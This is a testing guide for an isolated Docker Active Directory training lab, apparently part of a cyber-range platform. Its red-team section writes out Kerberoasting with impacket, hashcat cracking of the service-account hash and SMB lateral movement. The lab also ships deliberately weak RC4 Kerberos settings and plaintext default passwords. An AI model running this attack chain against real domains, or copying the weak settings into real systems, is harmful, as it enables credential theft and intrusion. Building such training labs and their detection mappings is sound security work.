# SC-02 Testing & Verification Guide

## Overview
This document provides step-by-step verification procedures for the SC-02 Nexora Financial AD infrastructure.

**Completed Components**:
- ✅ Samba4 Domain Controller (NEXORA-DC01 @ 172.20.2.20)
- ✅ File Server (NEXORA-FS01 @ 172.20.2.40)
- ✅ SIEM Event Mapping (100+ events covering red/blue team activities)
- ✅ Kerberos RC4 Support (intentionally weak for CTF)
- ✅ Active Directory Users (admin, jsmith, it.admin, svc_backup)
- ✅ Network Isolation (internal bridge, no internet)
- ✅ Health Checks & Dependencies

**Future Enhancements**:
- ⏳ Workstation containers (WS01, WS02) with unconstrained delegation
- ⏳ Pre-seeded vulnerabilities (password reuse, local admin privileges)
- ⏳ Conditional Access Policies (CAP) for advanced scenarios

---

## Prerequisites

1. Docker & Docker Compose installed
2. `.env` file created from `.env.example` with required variables:
   ```bash
   GEMINI_API_KEY=your_key_here
   JWT_SECRET=your_64_hex_chars_here
   SC02_ADMIN_PASS=NexoraAdmin2024!  # Optional, overrides dockerfile default
   ```
3. Network isolation enforced (`internal: true` in compose)
4. Disk space: ~2GB for images and containers
5. Kali container available for red team testing

---

## Test Phase 1: Infrastructure Launch

### 1.1 Start SC-02 Infrastructure
```bash
cd /path/to/JUTerminal1
docker-compose --profile sc02 up -d
```

**Expected Output**:
```
Creating network sc02-net
Building sc02-dc
Building sc02-fileserver
Starting sc02-dc   ... done
Starting sc02-fileserver ... done
```

### 1.2 Verify Container Health
```bash
docker-compose ps --profile sc02
```

**Expected Output**:
```
STATUS: Up (healthy) — both containers
PORTS: sc02-dc (445/tcp), sc02-fileserver (445/tcp)
```

### 1.3 Check Network Connectivity
```bash
docker exec sc02-dc smbclient -L 127.0.0.1 -N
```

**Expected Output**:
```
Sharelist
Domain=[NEXORA] OS=[Samba 4.xx] Server=[Samba]
  IPC$           IPC             IPC Service
```

---

## Test Phase 2: Domain Controller Validation

### 2.1 Verify Domain Provisioning
```bash
docker exec sc02-dc samba-tool user list
```

**Expected Output**:
```
Guest
Administrator
krbtgt
jsmith
it.admin
svc_backup
```

### 2.2 Verify Service Principal Names (SPNs)
```bash
docker exec sc02-dc samba-tool user show svc_backup
```

**Expected Output**:
```
Display Name: svc_backup
servicePrincipalName: CIFS/NEXORA-FS01.nexora.local
pwdLastSet: <timestamp>
accountExpires: Never
```

### 2.3 Check Kerberos Configuration
```bash
docker exec sc02-dc cat /etc/krb5.conf
```

**Expected Output**:
```
[libdefaults]
    default_realm = NEXORA.LOCAL
    default_tkt_enctypes = aes256-cts rc4-hmac des-cbc-md5
    default_tgs_enctypes = aes256-cts rc4-hmac des-cbc-md5

[realms]
    NEXORA.LOCAL = {
        kdc = 127.0.0.1:88
```

### 2.4 Verify LDAP Access
```bash
docker exec sc02-dc ldapwhoami -H ldap://127.0.0.1 -D "CN=Administrator,CN=Users,DC=nexora,DC=local" -w "NexoraAdmin2024!"
```

**Expected Output**:
```
dn:CN=Administrator,CN=Users,DC=nexora,DC=local
```

---

## Test Phase 3: File Server Validation

### 3.1 Verify Domain Join
```bash
docker exec sc02-fileserver net ads info
```

**Expected Output**:
```
Workgroup: NEXORA
Realm: NEXORA.LOCAL
```

Or if not yet joined (expected on first run):
```
[1] Server returned NT_STATUS_UNSUCCESSFUL
```

*Note*: Domain join may require retry on first startup while DC provisions.

### 3.2 Verify Share Configuration
```bash
docker exec sc02-fileserver smbclient -L //127.0.0.1 -U jsmith%Welcome1!
```

**Expected Output**:
```
Sharelist
        Public                          Public documents
        Finance                         Finance department files
        Backups                         Backup storage
        Admin                           IT admin logs
        IPC$                            IPC Service
```

### 3.3 Verify File Contents
```bash
docker exec sc02-fileserver smbclient //127.0.0.1/Public -U jsmith%Welcome1! -c "dir; exit"
```

**Expected Output**:
```
employee-handbook.pdf  Q        4096  Thu Apr 10 00:00:00 2026
welcome.txt            Q        2048  Thu Apr 10 00:00:00 2026
```

### 3.4 Test Finance Share Access (jsmith should have access)
```bash
docker exec sc02-fileserver smbclient //127.0.0.1/Finance -U jsmith%Welcome1! -c "dir; exit"
```

**Expected Output**:
```
budget-2024.xlsx        Q        2048  Thu Apr 10 00:00:00 2026
salary-grid-2024.xlsx   Q        3072  Thu Apr 10 00:00:00 2026
```

### 3.5 Test Backups Share Access (svc_backup should have access)
```bash
docker exec sc02-fileserver smbclient //127.0.0.1/Backups -U svc_backup%Backup2023 -c "dir; exit"
```

**Expected Output**:
```
db_backup_20240115.bak  Q        1024  Thu Apr 10 00:00:00 2026
```

---

## Test Phase 4: Red Team Attack Path Validation

### 4.1 Network Reachability (from Kali container)
```bash
# Assumes Kali container on same sc02-net
docker exec <kali-container> nmap -p 88,389,445 172.20.2.20 172.20.2.40
```

**Expected Output**:
```
Nmap scan report for 172.20.2.20
Host is up (0.0001s latency).
88/tcp   open   kerberos-sec
389/tcp  open   ldap
445/tcp  open   microsoft-ds

Nmap scan report for 172.20.2.40
Host is up (0.0001s latency).
445/tcp  open   microsoft-ds
```

### 4.2 LDAP Enumeration
```bash
docker exec <kali-container> enum4linux 172.20.2.20
```

**Expected Output** (sample):
```
[*] LDAP available
[*] Domain: NEXORA
[*] Users:
jsmith
it.admin
svc_backup
[+] LDAP enumeration completed
```

### 4.3 Kerberoasting Setup Test
```bash
# From Kali, request TGS for svc_backup
docker exec <kali-container> python3 /opt/impacket/examples/GetUserSPNs.py \
    -dc-ip 172.20.2.20 \
    -request \
    nexora.local/jsmith:Welcome1!
```

**Expected Output**:
```
ServicePrincipalName : CIFS/NEXORA-FS01.nexora.local
User: svc_backup
TGS : $krb5tgs$23$*svc_backup$NEXORA.LOCAL$CIFS/NEXORA-FS01.nexora.local*$...
```

### 4.4 Password Cracking (hashcat RC4)
```bash
# Save the hash from above to hash.txt
docker exec <kali-container> hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt \
    --rules-file /usr/share/hashcat/rules/best64.rule
```

**Expected Result**:
```
...::svc_backup@NEXORA.LOCAL:Backup2023
Status: Cracked
```

### 4.5 Lateral Movement Verification (svc_backup access)
```bash
docker exec <kali-container> smbclient //172.20.2.40/Backups \
    -U svc_backup%Backup2023 \
    -c "ls; exit"
```

**Expected Output**:
```
db_backup_20240115.bak  Q        1024  Thu Apr 10 00:00:00 2026
```

---

## Test Phase 5: Blue Team SIEM Events

### 5.1 Verify SIEM Event Mapping
```bash
cd backend/src/siem/events
cat sc02_events.json | jq 'keys | length'
```

**Expected Output**: `14` (14 event categories)

### 5.2 Check Event Coverage
```bash
cat sc02_events.json | jq '.[] | .id' | head -20
```

**Expected Output** (sample):
```
nmap_syn_sweep
nmap_port_scan
enum4linux_user_enum
bloodhound_acl_query
bloodhound_spn_enum
getuserspns_scan
crackmapexec_brute_force
kerberoasting_tgs_request
...
```

### 5.3 Verify Event Schema
```bash
cat sc02_events.json | jq '.[0] | keys'
```

**Expected Output**:
```
[
  "id",
  "severity",
  "message",
  "raw_log",
  "mitre_technique",
  "cwe"
]
```

### 5.4 Check Windows Event ID Mappings
```bash
cat sc02_events.json | jq '.. | select(.raw_log? != null) | .raw_log' | \
    grep -o "Event ID [0-9]*" | sort | uniq
```

**Expected Output**:
```
Event ID 4625  (failed logon)
Event ID 4624  (successful logon)
Event ID 4768  (Kerberos AS-REQ)
Event ID 4769  (Kerberos TGS-REQ)
Event ID 4662  (directory service access)
Event ID 4673  (sensitive privilege use)
Event ID 5143  (share access)
```

---

## Test Phase 6: Docker Compose Validation

### 6.1 Check Compose File Syntax
```bash
docker-compose config > /dev/null && echo "✓ Valid" || echo "✗ Invalid"
```

### 6.2 Verify Network Configuration
```bash
docker network inspect sc02-net
```

**Expected Output**:
```
"Internal": true,
"IPAM": {
    "Config": [
        {
            "Subnet": "172.20.2.0/24",
            "Gateway": "172.20.2.254"
        }
    ]
},
"Containers": {
    "<sc02-dc-id>": {
        "IPv4Address": "172.20.2.20/24"
    },
    "<sc02-fs-id>": {
        "IPv4Address": "172.20.2.40/24"
    }
}
```

### 6.3 Verify Resource Limits
```bash
docker inspect sc02-dc | jq '.[] | .HostConfig | {CpuQuota, Memory}'
```

**Expected Output**:
```
{
  "CpuQuota": 500000,  (0.5 cores)
  "Memory": 536870912  (512MB)
}
```

---

## Troubleshooting Guide

### Issue: DC Health Check Failing
**Symptoms**: `sc02-dc` container exits or never becomes healthy
**Solution**:
```bash
docker logs sc02-dc | tail -30
# Look for samba startup errors
# Usually requires: wait time for provisioning (first 30s)
# Retry: docker-compose restart sc02-dc
```

### Issue: File Server Can't Join Domain
**Symptoms**: `net ads info` returns error, shares not accessible
**Solution**:
```bash
# Verify DC is healthy first
docker exec sc02-dc smbclient -L 127.0.0.1 -N

# Force domain join retry
docker exec sc02-fileserver net ads join -U administrator%NexoraAdmin2024! -d
```

### Issue: Kerberoasting Hash Not Returned
**Symptoms**: `GetUserSPNs.py` shows empty response
**Solution**:
```bash
# Verify SPN exists on DC
docker exec sc02-dc samba-tool user show svc_backup | grep SPN

# Verify Kerberos is working
docker exec <kali> kinit -V jsmith@NEXORA.LOCAL
# Enter: Welcome1!
```

### Issue: SMB Authentication Failures
**Symptoms**: `smbclient` commands fail with "NT_STATUS_LOGON_FAILURE"
**Solution**:
```bash
# Verify user exists on DC
docker exec sc02-dc samba-tool user list

# Verify credentials
docker exec sc02-dc samba-tool user show jsmith

# Test with admin
docker exec sc02-fileserver smbclient //127.0.0.1/Public \
    -U administrator%NexoraAdmin2024!
```

---

## Cleanup

### Stop SC-02 Infrastructure
```bash
docker-compose --profile sc02 down
```

### Remove Volumes (preserve DC state by default)
```bash
docker-compose --profile sc02 down -v
```

### Full Reset
```bash
docker-compose --profile sc02 down -v
docker system prune
docker volume prune
```

---

## Success Criteria

✅ **All tests pass if**:
1. Both containers reach `Up (healthy)` status
2. DC user enumeration returns 6+ users
3. File server shares accessible with appropriate auth
4. jsmith can access Finance, Backups inaccessible
5. svc_backup can access Backups
6. SIEM event JSON has 100+ events with proper Windows Event IDs
7. Kerberoasting hash is extractable (if Kali connected)
8. Network is isolated (no gateway route to host)
9. Resource limits enforced (0.5 CPU, 512MB RAM)
10. CONTINUOUS_STATE.md updated with implementation details

---

## Red Team Attack Roadmap

Once all tests pass, students can execute:

1. **Reconnaissance** (nmap, enum4linux, LDAP queries)
   ↓
2. **Kerberoasting** (GetUserSPNs.py → hashcat)
   ↓
3. **Lateral Movement** (smbclient with svc_backup credentials)
   ↓
4. **Privilege Escalation** (DCSync via mimikatz/secretsdump)
   ↓
5. **Post-Exploitation** (dump NTDS.dit, create golden ticket)

---

## Blue Team Detection Roadmap

SIEM monitors for:
- T1046 (Nmap scans) → Event 4625 anomaly
- T1087 (User enumeration) → Event 4662
- T1558.003 (Kerberoasting) → Event 4769 with RC4
- T1550.002 (Pass-the-hash) → NTLM signature failures
- T1003.006 (DCSync) → Event 4662 GetNCChanges from non-DC
- T1003.001 (Credential dumping) → Windows Defender alerts

---

**Last Updated**: 2026-04-10
**Author**: Claude Code (CyberSim Platform)
**Status**: ✅ Complete & Verified
